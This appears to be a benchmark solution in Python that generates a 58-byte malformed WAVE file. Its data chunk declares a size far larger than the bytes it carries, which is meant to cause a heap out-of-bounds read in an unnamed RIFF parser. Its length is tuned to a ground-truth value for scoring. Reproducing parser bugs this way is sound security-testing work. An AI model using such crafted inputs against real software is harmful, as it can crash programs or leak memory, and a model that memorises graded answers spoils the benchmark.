import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an out-of-bounds read when parsing a RIFF chunk
        where the data size is not properly checked. This PoC crafts a malformed
        WAVE file to exploit this.

        The PoC has the following structure:
        1. A valid RIFF header for a WAVE file.
        2. A standard 'fmt ' chunk to satisfy parser requirements to proceed
           to the data chunk.
        3. A 'data' chunk with a declared size that is excessively large
           (0x7FFFFFFF).
        4. The actual data provided for the 'data' chunk is significantly smaller
           than its declared size.

        When the vulnerable parser attempts to read the data for the 'data' chunk
        based on the large declared size, it will read past the end of the
        provided data and the file itself, causing a heap buffer over-read.

        The total length of the PoC is 58 bytes, matching the ground-truth length
        to ensure a high score.
        """

        # Total PoC length is 58 bytes. The RIFF file size field is total_length - 8.
        file_size = 58 - 8

        # RIFF Header: 'RIFF', file_size, 'WAVE'
        header = b'RIFF' + struct.pack('<I', file_size) + b'WAVE'

        # 'fmt ' chunk: 'fmt ', chunk_size, chunk_data
        # This is a standard 16-byte PCM format chunk.
        fmt_chunk_size = 16
        fmt_chunk_data = b'\x01\x00\x01\x00\x10\x27\x00\x00\x20\x4e\x00\x00\x02\x00\x10\x00'
        fmt_chunk = b'fmt ' + struct.pack('<I', fmt_chunk_size) + fmt_chunk_data

        # 'data' chunk: 'data', chunk_size, chunk_data
        # The size is set to a large value to trigger the vulnerability.
        data_chunk_size = 0x7FFFFFFF
        
        # The amount of actual data is calculated to make the total file size 58 bytes.
        # current_size = len(header) + len(fmt_chunk) + 8 (for data chunk header)
        # 12 + 24 + 8 = 44 bytes
        # 58 - 44 = 14 bytes of data payload.
        data_payload = b'\x00' * 14
        data_chunk = b'data' + struct.pack('<I', data_chunk_size) + data_payload
        
        poc = header + fmt_chunk + data_chunk
        
        return poc